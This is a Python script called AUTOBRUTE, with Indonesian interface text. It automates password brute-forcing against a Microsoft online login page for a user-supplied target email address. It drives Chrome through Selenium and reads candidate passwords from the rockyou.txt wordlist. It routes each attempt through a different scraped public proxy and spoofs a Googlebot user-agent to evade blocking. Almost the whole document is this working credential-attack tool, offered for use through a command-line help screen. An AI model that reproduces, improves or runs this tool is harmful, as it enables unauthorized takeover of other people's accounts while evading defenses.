from selenium.webdriver.chrome.service import Service as Service
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import *
from selenium import webdriver
import time, re
from termcolor import colored
from proxy_randomizer import RegisteredProviders
import requests
import sys
import os
import glob

wordList = "C:/Users/User/Downloads/rockyou.txt"
chrome_driver = "C:\chromedriver_win32\chromedriver117.exe"
startTime = time.time()
doneTime = time.time()
bruteTime = doneTime - startTime
dirNow = os.getcwd()
proxy = []
listProx = []
urlms = "https://login.microsoftonline.com/01c6612d-aa71-437c-b463-aa0309288e3b/oauth2/v2.0/authorize?response_type=id_token&scope=openid%20profile&client_id=8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD.com&state=f5975981-75f2-43ca-8b53-8bf8c26cb603&nonce=16d308ea-d6fc-8AFcmXsQttSXuBeYCL9fpa2rn5JrDwwoihMerrwF48V7Ar1EKNTZyGa6G2tMFMhEZNEReroTLe2gPSMQw6VZLSD65AyBqzD3a361579-d75b-40f5-88b2-c9372e8488ff&prompt=select_account&response_mode=fragment"
def proxGen(jumlah):
    print("Proses Generate Proxy")
    uwu = int(jumlah)
    rp = RegisteredProviders()
    a = 0
    rp.parse_providers()
    for TtT in rp.proxies:
        a += 1
        if a <= uwu:
            prox = {"http": TtT.get_proxy()}
            respon = requests.get("https://google.com", proxies=prox)
            if respon.status_code == 200:
                proxy.append(TtT)
            else:
                print(TtT, "Tidak dapat digunakan")
        else:
            break
    print("Verifikasi proxy berhasil")
    for huhu in proxy:
        hai = str(huhu).split()
        listProx.append(hai[0])        

def hitungIsi(passwordnya):
    print("Proses Menghitung Jumlah Baris Wordlist")
    with open(passwordnya, errors='ignore') as file:
        jBaris = len(file.readlines())
    proxGen(jBaris)
def logo():
    print(colored("\n_______________\\\nAUTOBRUTE - 2023\\\nbrute force      \\\n==================o>>","magenta"))
def bruteEmail(email, file):
    try:
        print("Proses BruteForce")
        with open(file, 'r') as listPwd:
            for pwd, proxxx in zip(listPwd, listProx):
                print(f"\nBrute akun {email} dengan password: {pwd}")
                options = webdriver.ChromeOptions()
                # options.add_argument('--headless')
                options.add_argument('--silent')
                options.add_argument('--log-level=3')
                options.add_experimental_option("detach", True)
                options.add_argument('user-agent=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                capabilities = webdriver.DesiredCapabilities.CHROME
                prox = Proxy()
                httprox = "http://"+proxxx
                prox.http_proxy = httprox
                prox.add_to_capabilities(capabilities)
                driver = webdriver.Chrome(chrome_driver,options=options, desired_capabilities=capabilities)
                driver.get(urlms)
                driver.implicitly_wait(5)
                driver.find_element(By.NAME, "loginfmt").send_keys(email)
                driver.find_element(By.CSS_SELECTOR, "input[type=\'submit\']").click()
                time.sleep(3)
                verifPWD = driver.current_url
                print(urlms)
                print(verifPWD)
                if urlms != verifPWD:
                    passwwdd = driver.find_element(By.NAME, "passwd")
                    driver.execute_script("arguments[0].value = arguments[1];", passwwdd, pwd)
                    passwwdd.send_keys(Keys.ENTER)
                    print(colored("Proses Submit","yellow"))
                    driver.quit()
                    newUrl = driver.current_url
                    if verifPWD != newUrl:
                        print(colored(f"{pwd} bukan passwordnya ","red"))
                    else:
                        print(colored(f"PASSWORD DITEMUKAN\nEmail: {email}\nPassword: {pwd}","green"))
                    driver.quit()
                else:
                    driver.quit()
                    print("Terjadi error ketika verif password")
    except FileNotFoundError:
        driver.quit()
        print(colored(f"File {wordList} tidak ditemukan"),"red")
    except NoSuchElementException:
        driver.quit()
        pass
    except Exception as e:
        driver.quit()
        print(e)
    except KeyboardInterrupt:
        driver.quit()
        print(colored("Program close ya", "magenta"))

def main():
    try:
        logo()
        if len(sys.argv) < 2:
            print(colored("Untuk bantuan:\n  AutoBrute.py -h\n","yellow"))
        elif str(sys.argv[1]) == "-h" or str(sys.argv[1]) == "--help":
            print(colored("Cara penggunaan:\n-e/--email - email target\n-m/--mode  - mode\n             auto - otomatis brute\n             wordlist \"Lokasi Wordlist.txt\"- wordlist punya sendiri\n","yellow"))
            print("AutoBrute.py -e/--email target@gmail.com -m/--mode auto\nAutoBrute.py -e/--email target@gmail.com -m/--mode wordlist \"C:\worldlist.txt\"\n")
        elif str(sys.argv[1]) == "-e" or str(sys.argv[1]) == "--email":
            if len(sys.argv) < 3:
                print("\nMohon masukan email target, panduan:\n  AutoBrute -h\n")
            elif len(sys.argv) > 2:
                email = str(sys.argv[2])
                if (re.search('^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$', email)):
                    if len(sys.argv) < 4:
                        print("\nMohon masukan mode (-m/--mode), panduan:\n  AutoBrute -h\n")
                    elif str(sys.argv[3]) == "-m" or str(sys.argv[3]) == "--mode":
                        if len(sys.argv) < 5:
                            print("\nMohon masukan option mode (auto/wordlist), panduan:\n  AutoBrute -h\n")
                        elif str(sys.argv[4]) == "auto":
                            print(colored("Mode AutoBrute","green"))
                            hitungIsi(wordList)
                            bruteEmail(email, wordList)
                        elif str(sys.argv[4] == "wordlist"):
                            if len(sys.argv) < 5:
                                print("\nMohon masukan lokasi wordlist \"C:\\wordlist.txt\", panduan:\n  AutoBrute -h\n")
                            else:
                                print(colored("Mode Wordlist Sendiri\n","green"))
                                namaFile = str(sys.argv[5])
                                fileList = glob.glob(os.path.join(dirNow, namaFile))
                                for file in fileList:
                                    hitungIsi(file)
                                    bruteEmail(email, file)
                        else:
                            print("\nMohon baca ulang panduan:\n  AutoBrute -h\n")
                    else:
                        print("\nMohon baca ulang panduan:\n  AutoBrute -h\n")
                else:
                    print(colored("\nSilahkan masukan email dengan benar\n","yellow"))
        else:
            print("\nMohon baca ulang panduan:\n  AutoBrute -h\n")
    except KeyboardInterrupt:
        print(colored("Program close ya", "magenta"))

if __name__ == '__main__':
    main()
